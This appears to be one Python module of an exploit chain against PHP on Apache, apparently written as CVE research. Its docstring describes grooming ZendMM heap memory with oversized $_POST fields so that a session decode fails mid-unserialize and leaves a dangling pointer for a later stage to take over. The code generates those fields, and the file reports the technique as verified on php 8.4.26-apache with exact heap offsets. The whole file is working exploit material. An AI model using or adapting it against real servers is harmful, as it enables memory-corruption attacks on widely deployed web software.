#!/usr/bin/env python3 -I
# INDEX: drive ZendMM real_size to the limit off-chunk via huge $_POST fields | apache | pure HTTP
"""Off-chunk memory pressure: raise ZendMM real_size toward memory_limit using $_POST field
values larger than ZEND_MM_CHUNK_SIZE (2 MiB), each of which ZendMM serves as a separate mmap'd
"huge" allocation rather than from the 2 MiB request chunk (CVE-2026-109619 seat research).

Why off-chunk: a later request-startup session decode that OOMs mid-php_var_unserialize leaves
BG(unserialize) dangling at a freed var_entries (E) / var_dtor_entries (DT). The finisher re-occupies
E/DT at fixed chunk-relative offsets, so the arm must not perturb the main chunk. Small ($_POST)
pressure lands IN the chunk and shifts E/DT up (breaks the finisher geometry); huge (>2 MiB) pressure
lands in separate mmaps, so d/E/DT decode into their natural, pressure-free chunk offsets -- the same
E@e_off / DT the no-pressure (big-session) arm produces. The pressure bridges the gap between the
HTTP-seedable session size (< flush-ceiling ~limit/3) and the decode-OOM floor (~limit/2): a moderate
seeded session plus `n` huge fields crosses memory_limit inside the session decode.

Each field rounds up to a ZEND_MM_CHUNK_SIZE multiple of real_size (a >2 MiB field costs ~4 MiB), so
`n` tunes real_size coarsely; the seeded session's big-record bulk is the fine decode-OOM window.
Send chunked (ZendMM real_size is sticky high-water; chunked keeps the raw-body transient low).

API:
  pressure_parts(n, size=3_900_000, name_fmt=b"q%04d") -> n (name, value, None) $_POST tuples, each
    value `size` bytes (> 2 MiB => huge/off-chunk). Interleave BEFORE the file part that triggers the
    upload-progress FILE_START decode.

Tested: php:8.4.26-apache @32M (lab/apsf --profile apsf32): n=3 x 3.9 MB over a ~5 MB seeded session
decode-OOMs at E@0x93000/DT@0x6c000 (identical to the big-session arm), worker survives.
Stage: VERIFIED 8.4.26-apache.
"""
CHUNK_SIZE = 2 << 20  # ZEND_MM_CHUNK_SIZE; values above this are served as huge (off-chunk) allocs


def pressure_parts(n, size=3_900_000, name_fmt=b"q%04d"):
    """`n` huge-field $_POST pressure tuples (name, value, None), each `size` bytes. `size` must
    exceed CHUNK_SIZE so ZendMM serves it off the main 2 MiB chunk (preserving the arm geometry)."""
    assert size > CHUNK_SIZE, "pressure field must exceed ZEND_MM_CHUNK_SIZE to stay off-chunk"
    return [(name_fmt % i, b"R" * size, None) for i in range(n)]
